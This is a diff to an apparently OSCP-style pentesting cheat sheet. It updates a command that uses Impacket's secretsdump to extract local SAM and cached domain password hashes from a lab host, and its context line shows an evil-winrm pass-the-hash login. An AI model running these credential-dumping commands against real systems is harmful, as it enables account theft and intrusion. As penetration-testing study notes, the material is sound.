@@ -211,7 +211,7 @@ evil-winrm -i ip -u username -H ntlm_hash
 
 ###### Dump the local password hash and domain cached hash
 ```
-/usr/share/doc/python3-impacket/examples/secretsdump.py offsec.local/Allison@192.168.176.59 -outputfile /home/kali/Desktop/admin_hash.txt
+impacket-secretsdump -sam SAM -system SYSTEM offsec.local/Allison@192.168.176.59 -outputfile /home/kali/Desktop/admin_hash.txt
 ```
 ###### Other Tools
 ```
